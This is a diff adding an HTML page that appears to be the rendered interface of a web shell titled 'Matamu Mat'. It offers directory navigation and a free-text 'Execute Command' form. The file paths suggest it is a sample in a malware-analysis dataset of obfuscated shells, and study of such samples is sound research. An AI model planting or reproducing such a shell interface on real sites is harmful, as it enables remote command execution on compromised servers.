@@ -1,0 +1,37 @@
+
+<html>
+<head>
+<title> Matamu Mat </title>
+</head>
+<body>
+<hr><br>
+
+
+<form name="myform" action="" method="post">
+<p>Current working directory: <b>
+<a href="?work_dir=/">Root</a>/<a href="?work_dir=%2Fhome">home</a>/<a href="?work_dir=%2Fhome%2Fcj">cj</a>/<a href="?work_dir=%2Fhome%2Fcj%2FMALMAX">MALMAX</a>/<a href="?work_dir=%2Fhome%2Fcj%2FMALMAX%2Fmalmax-shipped">malmax-shipped</a>/<a href="?work_dir=%2Fhome%2Fcj%2FMALMAX%2Fmalmax-shipped%2Fmalmax-shipped">malmax-shipped</a>/<a href="?work_dir=%2Fhome%2Fcj%2FMALMAX%2Fmalmax-shipped%2Fmalmax-shipped%2Fsamples">samples</a>/<a href="?work_dir=%2Fhome%2Fcj%2FMALMAX%2Fmalmax-shipped%2Fmalmax-shipped%2Fsamples%2Fobfuscated">obfuscated</a>/<a href="?work_dir=%2Fhome%2Fcj%2FMALMAX%2Fmalmax-shipped%2Fmalmax-shipped%2Fsamples%2Fobfuscated%2F1">1</a>/</b></p>
+<p>Choose new working directory:
+<select name="work_dir" onChange="this.form.submit()">
+<option value="/home/cj/MALMAX/malmax-shipped/malmax-shipped/samples/obfuscated">Parent Directory</option>
+<option value="/home/cj/MALMAX/malmax-shipped/malmax-shipped/samples/obfuscated/1" selected>Current Directory</option>
+
+</select></p>
+
+<p>Command: <input type="text" name="command" size="60">
+<input name="submit_btn" type="submit" value="Execute Command"></p>
+
+<p>Enable <code>stderr</code>-trapping? <input type="checkbox" name="stderr"></p>
+<textarea cols="80" rows="20" readonly>
+
+
+</textarea>
+</form>
+
+<script language="JavaScript" type="text/javascript">
+document.forms[0].command.focus();
+</script>
+
+<hr>
+
+</body>
+</html>
